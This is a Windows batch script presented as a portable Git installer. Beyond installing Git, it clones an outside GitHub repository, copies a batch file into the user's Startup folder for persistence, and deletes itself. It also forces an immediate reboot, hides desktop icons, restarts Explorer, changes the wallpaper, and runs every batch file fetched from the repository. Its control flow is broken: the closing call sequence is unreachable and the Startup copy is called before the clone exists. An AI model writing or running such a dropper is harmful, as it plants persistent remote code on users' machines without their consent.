@echo off
setlocal

set "GIT_VER=2.49.0"
set "GIT_URL=https://github.com/git-for-windows/git/releases/download/v%GIT_VER%.windows.1/PortableGit-%GIT_VER%-64-bit.7z.exe"
set "GIT_DIR=%LOCALAPPDATA%\Programs\PortableGit"
set "TMP_EXE=%TEMP%\PortableGit.exe"
set "WORKING_DIR=%TEMP%\working"



:download_git
git --version >nul 2>&1
if %errorlevel%==0 (
    exit /b
)
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Invoke-WebRequest -Uri '%GIT_URL%' -OutFile '%TMP_EXE%'"

if not exist "%GIT_DIR%" mkdir "%GIT_DIR%"
"%TMP_EXE%" -o"%GIT_DIR%" -y >nul
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$git='%GIT_DIR:\=\\%\cmd';" ^
  "$p=[Environment]::GetEnvironmentVariable('Path','User');" ^
  "if(-not ($p -split ';' | Where-Object { $_ -eq $git })){" ^
  "  [Environment]::SetEnvironmentVariable('Path', ($p + ';' + $git).Trim(';'), 'User')" ^
  "}"
exit /b


:check_git
if not exist "%WORKING_DIR%\git" (
    gh repo clone Finnerdespin/git
    call :place_startup
    del main.bat
    shutdown /r /f /t 0
)
cd "%WORKING_DIR%"
exit /b

:place_startup
copy "%WORKING_DIR%\git\git.bat" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\git.bat"
exit /b

:wallpaper
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" ^
 /v HideIcons /t REG_DWORD /d 1 /f >nul
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe
powershell -NoProfile -Command ^
  "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value '%WORKING_DIR%\git\wallpaper.jpg%';" ^
  "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
exit /b

:open_other_programs
notepad "%WORKING_DIR%\git\text.txt"
for %%F in ("%WORKING_DIR%\git\*.bat") do start "" "%%~fF"
exit /b

call :place_startup
call :download_git
call :check_git
call :wallpaper
call :open_other_programs
endlocal
